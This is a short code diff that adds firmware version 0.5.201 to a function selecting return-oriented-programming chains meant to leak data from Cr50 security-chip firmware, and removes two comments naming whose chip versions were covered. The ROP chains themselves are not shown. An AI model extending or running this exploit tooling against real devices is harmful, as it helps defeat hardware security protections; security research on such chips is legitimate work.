@@ -30,6 +30,7 @@
 #include "rop.hh"
 #include "rop-0-5-120.h"
 #include "rop-0-5-153.h"
+#include "rop-0-5-201.h"
 
 using namespace std;
 
@@ -60,7 +61,6 @@ static uint8_t *get_dataleak_chain(uint32_t adr, uint32_t len, size_t &out_size)
 	uint32_t main_size = 0;
 	uint32_t init_size = 0;
 
-	/* appleflyer's Cr50 version */
 	if (ver == "0.5.120") {
 		main_chain = leak_data_main_ropchain_0_5_120;
 		init_chain = init_ropchain_0_5_120;
@@ -68,13 +68,19 @@ static uint8_t *get_dataleak_chain(uint32_t adr, uint32_t len, size_t &out_size)
 		main_size = sizeof(leak_data_main_ropchain_0_5_120);
 		init_size = sizeof(init_ropchain_0_5_120);
 		
-	/* Hannah's and WTT's Cr50 version */
 	} else if (ver == "0.5.153") {
 		main_chain = leak_data_main_ropchain_0_5_153;
 		init_chain = init_ropchain_0_5_153;
 
 		main_size = sizeof(leak_data_main_ropchain_0_5_153);
 		init_size = sizeof(init_ropchain_0_5_153);
+
+	} else if (ver == "0.5.201") {
+		main_chain = leak_data_main_ropchain_0_5_201;
+		init_chain = init_ropchain_0_5_201;
+
+		main_size = sizeof(leak_data_main_ropchain_0_5_201);
+		init_size = sizeof(init_ropchain_0_5_201);
 
 	} else {
 		return nullptr;
